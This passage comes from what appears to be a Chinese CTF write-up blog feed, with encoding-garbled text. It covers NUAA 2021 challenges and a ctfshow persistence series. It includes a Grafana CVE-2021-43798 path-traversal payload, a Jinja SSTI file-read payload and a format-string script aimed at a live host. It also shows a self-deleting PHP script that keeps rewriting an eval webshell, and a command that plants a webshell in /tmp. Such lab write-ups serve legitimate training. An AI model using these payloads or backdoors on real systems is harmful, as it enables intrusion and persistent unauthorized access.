<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†âœ…ğŸ˜€ğŸ¤£âŒ¨ğŸâ˜€ğŸ¥‹ğŸ˜†ğŸ™ƒğŸƒğŸ˜ğŸâ˜‚ğŸšªğŸŒªğŸ’µğŸš¨âŒ¨ğŸ˜ğŸ”ªâœ–ğŸˆğŸŒğŸ”„ğŸ–ğŸ¦“ğŸŒğŸ•¹ğŸ˜ğŸ‘ŒğŸŒ‰ğŸ’µğŸğŸš«ğŸ¤£ğŸ–ğŸ’§ğŸğŸŒ¿ğŸ˜ğŸğŸš¨ğŸğŸ’µğŸŒ¿ğŸ¹ğŸ…ğŸ™ƒğŸ‘‘ğŸ˜†â˜ƒğŸ…ğŸ•¹ğŸ˜‡ğŸ¹ğŸ¹ğŸµğŸˆğŸğŸ¤£ğŸ˜ğŸğŸš¨ğŸ¹ğŸ‘£ğŸ”„ğŸ¤£ğŸˆğŸ˜‚ğŸâœ…ğŸ˜€âœ…ğŸšªğŸ˜ğŸ˜€ğŸ—’ğŸ—’<br></code></pre></td></tr></table></figure>
<p>emoji-aes,åŠ ä¸Šå¯†é’¥<br>è§£å‡ºï¼šflag{AES_1s_Gr3atS0_y0u_L1ke_1t_V3ry_Much}</p>
<h2 id="questionnaire"><a href="#questionnaire" class="headerlink" title="questionnaire"></a>questionnaire</h2><p>é—®å·è°ƒæŸ¥ï¼Œç­”æ¡ˆåˆ†åˆ«ä¸º</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Naijing</span> University of Aeronautics <span class="hljs-keyword">and</span> Astronautics<br>éƒ½ç¼º<br><span class="hljs-symbol">Asuri</span><br>èˆªç©ºèˆªå¤©æ°‘èˆª<br>æ™ºå‘¨ä¸‡ç‰©,é“æµå¤©ä¸‹<br>è¾…å¯¼å‘˜å®¡æ ¸<br>å°†å†›è·¯æ ¡åŒº<br></code></pre></td></tr></table></figure>
<p>asuri{baigei_h4ve_funnnn}</p>
<h2 id="æˆ‘ä»¬ç”Ÿæ´»åœ¨å—äº¬ï¼ˆä¸€ï¼‰â€”â€”ç©¿è¶Šæ—¶ç©ºçš„ç”µæ³¢"><a href="#æˆ‘ä»¬ç”Ÿæ´»åœ¨å—äº¬ï¼ˆä¸€ï¼‰â€”â€”ç©¿è¶Šæ—¶ç©ºçš„ç”µæ³¢" class="headerlink" title="æˆ‘ä»¬ç”Ÿæ´»åœ¨å—äº¬ï¼ˆä¸€ï¼‰â€”â€”ç©¿è¶Šæ—¶ç©ºçš„ç”µæ³¢"></a>æˆ‘ä»¬ç”Ÿæ´»åœ¨å—äº¬ï¼ˆä¸€ï¼‰â€”â€”ç©¿è¶Šæ—¶ç©ºçš„ç”µæ³¢</h2><p>audacityåè½¬éŸ³é¢‘ï¼Œä¼šå¬åˆ°ä¸€äº›è‹±è¯­å•è¯ï¼Œæ ¹æ®æ— çº¿ç”µè‹±è¯­å­—æ¯å‘éŸ³è¡¨æ¥å†™</p>
<p><img src="/img/wp/2021/2021nuaa-5.png"></p>
<p><code>RADIOWAVESACROSSTIME</code></p>
<h2 id="Try2FindMe"><a href="#Try2FindMe" class="headerlink" title="Try2FindMe"></a>Try2FindMe</h2><p>æ¯”èµ›çš„æ—¶å€™ç”¨å‰‘é¾™ä¸€ç›´æŠ¥é”™ï¼ŒåŠ ä¸Šå¿«ç»“æŸäº†ï¼Œå°±æ²¡å¾€ä¸‹çœ‹<br>ç»“æŸåçœ‹äº†wpæ‰çŸ¥é“æ˜¯<code>magic number</code>çš„é—®é¢˜<br>èµ›åå¤ç°ï¼š</p>
<p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œbinwalkåˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°ä¸€ä¸ªpycæ–‡ä»¶<br>åç¼–è¯‘pycæ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">x, cipher</span>):<br>    key = x + <span class="hljs-string">&#x27;n0lve3t6r1s&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        aes = AES.new(key.rjust(<span class="hljs-number">24</span>, <span class="hljs-string">&#x27;A&#x27;</span>), AES.MODE_ECB)<br>        cipher = binascii.unhexlify(cipher)<br>        flag = aes.decrypt(cipher).decode()<br>        <span class="hljs-keyword">return</span> flag<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    c = <span class="hljs-string">&#x27;29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805&#x27;</span><br>    k = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input your key: &#x27;</span>)<br>    flag = decrypt(k, c)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wow, you find it!!!&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Oh no!!!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
<p>ä¸€ä¸ªAESåŠ å¯†ï¼Œä½†æ˜¯å°‘äº†13ä½å¯†é’¥</p>
<p>é¢˜ç›®ç»™å‡ºçš„hintï¼š<code>pyc éšå†™ python 3.7.11</code><br>pycéšå†™ï¼Œå…ˆåœ¨githubä¸Šä¸‹è½½<a href="https://github.com/AngelKitty/stegosaurus">å‰‘é¾™</a></p>
<p>ä½†æ˜¯å‰‘é¾™æœ‰å‡ ä¸ªå‘è¦æ³¨æ„ï¼š<br>1ï¼šè¦ç”¨python3.6è¿è¡Œè„šæœ¬<br>2ï¼špython3.6ä»¥ä¸‹magic numberæ˜¯12ä¸ªå­—èŠ‚ï¼›python3.7ä»¥ä¸Šæ˜¯16ä¸ªå­—èŠ‚</p>
<p>å› ä¸ºgithubä¸Šä¸‹è½½çš„è„šæœ¬é»˜è®¤æ˜¯ä½¿ç”¨<code>12</code>ä¸ªå­—èŠ‚è§£å¯†ï¼Œä½†æ˜¯é¢˜ç›®ä¸­æ˜¯python3.7çš„ç¯å¢ƒï¼Œæ‰€ä»¥å½“æ—¶ä¸€ç›´æŠ¥é”™<br>æˆ‘ä»¬éœ€è¦å°†è„šæœ¬ä¸­ç¬¬123è¡Œçš„<code>header = f.read(12)</code>æ”¹ä¸º<code>header = f.read(16)</code><br><img src="/img/wp/2021/2021nuaa-6.jpg"></p>
<p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°ç¼ºå°‘çš„å¯†é’¥<code>k5fgb2eur5sty</code><br><img src="/img/wp/2021/2021nuaa-7.jpg"></p>
<p>ä½†æ˜¯åœ¨è„šæœ¬ä¸­è§£å¯†AESæ˜¯å¤±è´¥çš„ï¼Œå‡ºé¢˜äººç»™å‡ºçš„è§£é‡Šæ˜¯<code>æœ€åçš„ AES è·‘ä¸å‡ºæ¥å¯èƒ½æ˜¯ python ä¾èµ–ç‰ˆæœ¬ä¸ä¸€æ ·å¯¼è‡´é”…äº†ï¼Œé—®é¢˜ä¸å¤§ï¼Œæ‰¾ä¸ªåœ¨çº¿çš„ AES è§£å¯†å°±è¡Œ</code></p>
<p><img src="/img/wp/2021/2021nuaa-8.jpg"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>ç®€å•å†™ä¸ªè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">d=<span class="hljs-string">&#x27;oclz&#123;loovyd_vb_l_bvnucd_hqpumj&#125;&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> i  <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&#123;&#125;&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>            <span class="hljs-keyword">if</span> ((j*<span class="hljs-number">11</span>)%<span class="hljs-number">26</span>)==(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">97</span>):<br>                    e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-number">96</span>+j)<br>                    <span class="hljs-built_in">print</span>(e)<br>                    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2021/2021nuaa-9.png"><br>æœ€åç»“æœåŠ ä¸Šä¸‹åˆ’çº¿</p>
<h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><p>å…ˆæå–c1ã€c2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">c2 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.enc2&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read().<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<br>c1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.enc1&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read().<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(c1)<br><span class="hljs-built_in">print</span>(c2)<br></code></pre></td></tr></table></figure>

<p>å…±æ¨¡æ”»å‡»è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s,s2n<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a, b</span>):<br>  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>  <span class="hljs-keyword">else</span>:<br>    g, y, x = egcd(b % a, a)<br>    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>  n = <span class="hljs-number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span><br>  c1 = <span class="hljs-number">409050138400231971554294088177137255457866075540394361465618420085942037334914972271553348781734546381272987423855027216175678797436131073306888763180501523905135583905144901381224572922542735812959826069495112995911282269377230245515683164143316763758642080370867274365360647518283349684822272605576874844625387807047876206532634507258565110299247417968586498427727688356287596783690957837504438650897148190345700044861267114786057049491164836631033845216983588558199652913012590435836646957168387808248342739079479547784004511726635639407815336376908051269831834833967007931321906512831272657668494512124731674031937509111585885992978363095964860952405173714000880231608814695517820595229454266690556749667796735461828114590568954658520700475934939183919597602772428393159957171678913035977611490511885932486154785287709132255326686398261542844030065556598666191350007752712425713619749771672365637485154754564779267050928584728661807027994863116745339833084769533981399300503220638563466169390183736267153617583845250415885823024980144631079997094009230377992595577328633292390530018606442243369688905175147209020920954422003555782869268678894916106413862664953146515732785804502660407314901808581405034432308726147933849979689989</span><br>  c2 = <span class="hljs-number">660786051824910230873884600744959030265388429192727951166721113879854464522389325739802703310913732902833778034401632628938144275110259033918655077691853918758634982899427693594671785857857909036915654998761013827868199342737749405352507276436866364180154665315956829382533710951839019853169966694154970158966072113917267296101513243808003273019100867933714599898053661451818477001562112853209154906322205083636027498233807131522283087979547271774312067398759611022191882371123084261761098923994873110788704960182273817371315264655632343946622563006808101322364265578490109714246148052618988958628592753911496921563155003551926547472410642201974274781280633708636309449501619866376422440041537758514811836133804597783256003504933767151921016752120604258580059668650713822253122650687275054081288622996628277268146723350191531420962242602380839728712825405572549099787290957348706683963946075215806340393267714297975946671488782713260980129229158285210722045502442378445134853897763065681974592818004420357542042894544487694477937617156099760573978759048442186633017206146993595028297257148566673402976005517349438948032707348011387517929999285636559431700923275025083662201127580201286747957827301089492530820945594666308738557238429</span><br>  e1 = <span class="hljs-number">17</span><br>  e2 = <span class="hljs-number">65537</span><br>  s = egcd(e1, e2)<br>  s1 = s[<span class="hljs-number">1</span>]<br>  s2 = s[<span class="hljs-number">2</span>]<br>  <span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:<br>    s1 = - s1<br>    c1 = invert(c1, n)<br>  <span class="hljs-keyword">elif</span> s2&lt;<span class="hljs-number">0</span>:<br>    s2 = - s2<br>    c2 = invert(c2, n)<br>  m = <span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n) % n<br>  <span class="hljs-built_in">print</span> n2s(m)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  main()<br></code></pre></td></tr></table></figure>


<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="IDA-Start"><a href="#IDA-Start" class="headerlink" title="IDA Start"></a>IDA Start</h2><p>ida64æ‰“å¼€ï¼Œshift+F12</p>
<p>flag{St4rt_t0_u3e_IDA}</p>
<h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><p>IDAåˆ†æ<br>mainå‡½æ•°é‡Œé¢æœ‰å¼‚æˆ–<br><img src="/img/wp/2021/2021nuaa-10.png"></p>
<p>ç„¶åmainå‡½æ•°ä¸­å…ˆä½¿ç”¨æŸä¸ªå‡½æ•°è°ƒç”¨äº†å¦ä¸€ä¸ªå‡½æ•°<br><img src="/img/wp/2021/2021nuaa-11.png"></p>
<p>è¿™ä¸ªå‡½æ•°ä¸­ä¹Ÿå­˜åœ¨å¼‚æˆ–<br><img src="/img/wp/2021/2021nuaa-12.png"></p>
<p>è„šæœ¬è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">key=[ <span class="hljs-number">0x56</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x46</span>,<span class="hljs-number">0x54</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x7C</span>,<span class="hljs-number">0x75</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x43</span>,<span class="hljs-number">0x2B</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xFE</span>]<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;qasxcytgsasxcvrefghnrfghnjedfgbhn\x00&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>))<br>str2=[<span class="hljs-number">0</span>]*<span class="hljs-number">34</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">34</span>):<br>    str2[i]=key[i]^(<span class="hljs-number">2</span>*i+<span class="hljs-number">65</span>)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(str2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(str2[i]^<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>é€šè¿‡åˆ†æå‘ç°flag æ”¾åœ¨bufæŒ‡å‘çš„åœ°å€å¤„<br><img src="/img/wp/2021/2021nuaa-13.png"></p>
<p>è·å–<code>format</code>çš„åç§» ç„¶åè®¡ç®—å‡º<code>buf</code>çš„åç§»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>n=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>	<span class="hljs-keyword">try</span>:<br>		p=process(<span class="hljs-string">&#x27;format&#x27;</span>)<br>		p.sendline(<span class="hljs-string">&#x27;aaaa%&#x27;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&#x27;$p&#x27;</span>)<br>		p.readuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>		d=p.read()<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;61616161&#x27;</span> <span class="hljs-keyword">in</span> d:<br>			<span class="hljs-built_in">print</span>(n,d)<br>			<span class="hljs-keyword">break</span><br>		<span class="hljs-built_in">print</span>(d)<br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">pass</span><br>	n=n+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2021/2021nuaa-14.png"><br>ä½¿ç”¨<code>%7$s</code>è·å–bufæŒ‡å‘çš„åœ°å€å¤„å‚¨å­˜çš„æ•°æ®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>n=<span class="hljs-number">8</span><br>p=remote(<span class="hljs-string">&quot;118.195.147.196&quot;</span>,<span class="hljs-number">9185</span>)<br>p.sendline(<span class="hljs-string">&quot;%7$s&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2021/2021nuaa-15.png"></p>
<h2 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h2><p>é¡¶çº§éé¢„æœŸ<br>1111111111131111111311121131114çæŒ‰<br>å½•äº†è§†é¢‘<br><img src="/img/wp/2021/2021nuaa-16.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="çœŸçš„ç­¾åˆ°"><a href="#çœŸçš„ç­¾åˆ°" class="headerlink" title="çœŸçš„ç­¾åˆ°"></a>çœŸçš„ç­¾åˆ°</h2><p>ç™¾åº¦åˆ°<code>CVE-2021-43798</code><br>payload:<code>/public/plugins/welcome/../../../../../../../../home/grafana/flag</code></p>
<p><img src="/img/wp/2021/2021nuaa-17.png"></p>
<h2 id="baby-python"><a href="#baby-python" class="headerlink" title="baby_python"></a>baby_python</h2><p>å‰ç«¯åº”è¯¥åšå¤„ç†äº†çœ‹ä¸è§å›æ˜¾ï¼Œä½¿ç”¨BurpSuite</p>
<p>ä¼ å…¥<code>&#123;&#123;self&#125;&#125;</code>ï¼Œè¿”å›æ¨¡æ¿æ•°æ®</p>
<p><img src="/img/wp/2021/2021nuaa-18.png"></p>
<p>å¸¸è§„äº†<code>self.__class__.__base__.__subclasses__()</code></p>
<p><img src="/img/wp/2021/2021nuaa-19.png"></p>
<p>æŸ¥çœ‹typeç±»çš„åˆå§‹åŒ–æ–¹æ³•ï¼Œä¼ å…¥<code>&#123;&#123;self.__class__.__base__.__subclasses__()[0].__init__&#125;&#125;</code>ï¼š</p>
<p><img src="/img/wp/2021/2021nuaa-20.png"></p>
<p>åé¢å°±æ˜¯å¸¸è§„payloadäº†ï¼Œè·‘ä¸€ä¸‹lsæœ‰æ–‡ä»¶åå°±ç›´æ¥è·å–äº†</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](<span class="hljs-name">&#x27;flllll11111114aaaaaggggggggggggg&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><a href="https://www.aisoutu.com/a/345834">å‚è€ƒæ–‡ç« </a></p>
<h2 id="Twister"><a href="#Twister" class="headerlink" title="Twister"></a>Twister</h2><p>F12çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶<code>f111444g.php</code><br><img src="/img/wp/2021/2021nuaa-21.png"><br>è®¿é—®ï¼Œè¯·æ±‚å¤´é‡Œç›´æ¥å°±æ˜¯flag<br><img src="/img/wp/2021/2021nuaa-22.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>nuaa</tag>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘webå…¥é—¨-æƒé™ç»´æŒ</title>
    <url>/posts/55be078a/</url>
    <content><![CDATA[<h1 id="WEB670-WEB676"><a href="#WEB670-WEB676" class="headerlink" title="WEB670-WEB676"></a>WEB670-WEB676</h1><p>è¿™å‡ é¢˜åšæ³•éƒ½ä¸€æ ·<br>å‘ç°<code>/var/www/html</code>ç›®å½•å¯å†™ï¼Œæ—¢ç„¶æ˜¯æƒé™ç»´æŒï¼Œé‚£ä¹ˆç›´æ¥ä¼ ä¸æ­»é©¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]) ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;.bk.php&quot;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>è®¿é—®ä¸€æ¬¡ä¸æ­»é©¬ï¼Œä¼šå‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº†<code>.bk.php</code><br>ç„¶åcheckï¼Œæˆ‘æ¨æµ‹è¿™ä¸ªcheckåº”è¯¥åªæ˜¯åˆ é™¤äº†å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰å…¶ä»–æ“ä½œ<br>å› ä¸ºæˆ‘ä»¬çš„é©¬æ˜¯ä¸æ–­ç”Ÿæˆçš„ï¼Œæ‰€ä»¥ä¾æ—§å¯ä»¥è®¿é—®<br>è¿™æ ·å°±æ‹¿åˆ°äº†è¿™ä¸ªé¶æœºçš„æƒé™å’Œflag</p>
<h1 id="WEB677-WEB678"><a href="#WEB677-WEB678" class="headerlink" title="WEB677-WEB678"></a>WEB677-WEB678</h1><p>å‘ç°æ²¡æœ‰æƒé™å†™å…¥æ–‡ä»¶<br>å®åœ¨æ²¡æ‹›äº†ï¼Œåœ¨g4ğŸ‘´é‚£é‡Œå­¦äº†ä¸€æ‹›</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;while true;do cat /f*;done&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>åœ¨ä¸€ä¸ªçª—å£å‘é€åè¿›ç¨‹ä¼šé”æ­»ï¼Œå¦ä¸€ä¸ªçª—å£check<br>ç¬¬ä¸€ä¸ªçª—å£å°±ä¼šä¸æ–­è¿”å›flag</p>
<p>åŸç†å¤§æ¦‚æ˜¯å› ä¸ºä¸æ€è¿›ç¨‹ï¼Œæ‰€ä»¥ç”¨æ­»å¾ªç¯ä¸€ç›´cat flag</p>
<h1 id="WEB679"><a href="#WEB679" class="headerlink" title="WEB679"></a>WEB679</h1><p>åœ¨å¯å†™çš„&#x2F;tmpç›®å½•ä¸‹ä¼ æœ¨é©¬å¹¶å†™ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åæäº¤5ç§’å†…è¿›â¾checkï¼Œcheckä¼šå…³é—­nginxå’Œphp-fpmï¼Œç”±äºæ˜¯www-dataæƒé™ï¼Œâ½†æ³•å¯åŠ¨nginxå’Œphp-fpmï¼Œç›´æ¥å¯åŠ¨phpå†…ç½®æœåŠ¡å™¨å³å¯</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">cmd=file_put_contents(&quot;/tmp/index.php&quot;,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);system(&quot;sleep 5 &amp;&amp; php -S 0.0.0.0:80 -t /tmp/&quot;);</span><br></code></pre></td></tr></table></figure>
<p>æ³¨æ„ç‰¹æ®Šå­—ç¬¦ç¼–ç <br>ä¼ å…¥åå¯ä»¥åœ¨èšå‰‘çœ‹çœ‹æœ‰æ²¡æœ‰æˆåŠŸå†™å…¥php<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%811.png"><br>flagåœ¨æ ¹ç›®å½•<br>ï¼ˆå‡ºç°<code>Notice: Undefined index: a in /tmp/index.php on line 1</code>æ˜¯æ­£å¸¸æƒ…å†µï¼‰<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%812.png"></p>
]]></content>
      <categories>
        <category>ctfshow-webå…¥é—¨</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>webå…¥é—¨</tag>
      </tags>
  </entry>
  <entry>
    <title>é¦–å±Šå®‰å¾½çœâ€œè¿½æ—¥æ¯â€å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›-wp</title>
    <url>/posts/45427b40/</url>
    <content><![CDATA[<p>æ··äº†ä¸ªä¸‰ç­‰å¥–ï¼Œå¥–çŠ¶è‡³ä»Šæœªå‘ï¼ˆä¸»åŠæ–¹è·‘è·¯äº†ã€‚ã€‚ã€‚ï¼‰</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>flag{welcome_to_zrb@2021}</p>
<h2 id="é˜µæ³•çš„å¥¥ç§˜"><a href="#é˜µæ³•çš„å¥¥ç§˜" class="headerlink" title="é˜µæ³•çš„å¥¥ç§˜"></a>é˜µæ³•çš„å¥¥ç§˜</h2><p>æç¤ºæ˜¯8è¿›åˆ¶ï¼Œè§‚å¯Ÿåˆ°æœ€åçš„æ•°å­—æ˜¯å˜åŒ–çš„</p>
